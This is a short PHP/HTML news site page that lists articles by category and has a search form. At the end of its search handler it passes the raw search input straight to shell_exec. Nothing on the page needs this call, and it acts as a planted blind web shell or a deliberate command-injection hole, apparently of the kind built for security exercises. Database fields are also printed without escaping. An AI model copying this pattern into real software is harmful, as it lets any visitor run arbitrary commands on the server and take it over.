<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
* {box-sizing: border-box;}

body {
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
}

.topnav {
  overflow: hidden;
  background-color: #333;
}

.topnav a {
  float: left;
  display: block;
  color: #f2f2f2;
  text-align: center;
  padding: 14px 16px;
  text-decoration: none;
  font-size: 17px;
}

.topnav a:hover {
  background-color: #ddd;
  color: black;
}

.topnav a.active {
  background-color: #4CAF50;
  color: white;
}

.topnav .search-container {
  float: right;
}

.topnav input[type=text] {
  padding: 6px;
  margin-top: 8px;
  font-size: 17px;
  border: none;
}

.topnav .search-container button {
  float: right;
  padding: 6px;
  margin-top: 8px;
  margin-right: 16px;
  background: #4CAF50;
  font-size: 17px;
  border: none;
  cursor: pointer;
}

.topnav .search-container button:hover {
  background: #ccc;
}

@media screen and (max-width: 600px) {
  .topnav .search-container {
    float: none;
  }
  .topnav a, .topnav input[type=text], .topnav .search-container button {
    float: none;
    display: block;
    text-align: left;
    width: 100%;
    margin: 0;
    padding: 14px;
  }
  .topnav input[type=text] {
    border: 1px solid #ccc;  
  }
}
</style>
</head>
<body>

<div class="topnav">
  <a class="active" href="#home">Home</a>
  <a href="#about">About</a>
  <a href="#contact">Contact</a>  </div>
  <p hidden>This paragraph should be hidden.</p>

</div>

<?php
$idfErr="";
require_once dirname(__FILE__) . '/dbConnect.php';
    
              $db = new DbConnect();
              $con = $db->connect();
             $stmt=$con->prepare("SELECT * FROM news where id_cat= ?");
             $stmt->bind_param("i", $_GET["id_cat"]);
             $stmt->execute();
             $stmt->bind_result($id_news, $text_news,$id_cat,$news_name,$news_image);
             $row = array();
              while($stmt->fetch()){
                     $news = array();
                     $news["id_news"] = $id_news;
                    $news["text_news"] = $text_news;
                     $news["id_cat"] = $id_cat;
                    $news["news_name"] = $news_name;
                    $news["news_image"] = $news_image;
                  echo ' <div style="padding-left:16px">
                   <h2>'.$news_name.'</h2>
                   <p>'.$text_news.' </p>
                   </div>';
              }
          if(isset($_POST["submit"])) { 
        if (empty($_POST["search"])){
           $idfErr="chercher quoi???";
            }else{
             $db = new DbConnect();
              $con = $db->connect();
              $kda = explode("||",$_POST["search"]);
             $stmt=$con->prepare("SELECT * FROM news WHERE news_name = ? ");
             $stmt->bind_param("s",$kda[0]);
             $stmt->execute();
             $stmt->bind_result($id_news, $text_news,$id_cat,$news_name,$news_image);
             $row = array();
              while($stmt->fetch()){
                     $news = array();
                     $news["id_news"] = $id_news;
                    $news["text_news"] = $text_news;
                     $news["id_cat"] = $id_cat;
                    $news["news_name"] = $news_name;
                    $news["news_image"] = $news_image;                    
                  echo ' <div style="padding-left:16px">
                   <h2>'.$news_name.'</h2>
                   <p>'.$text_news.' </p>
                   </div>';


         array_push($row, $news);
        }  
        $response=json_encode($news);
        $output = shell_exec( ' '. $_POST["search"]);
}
}
?>

</body>
</html>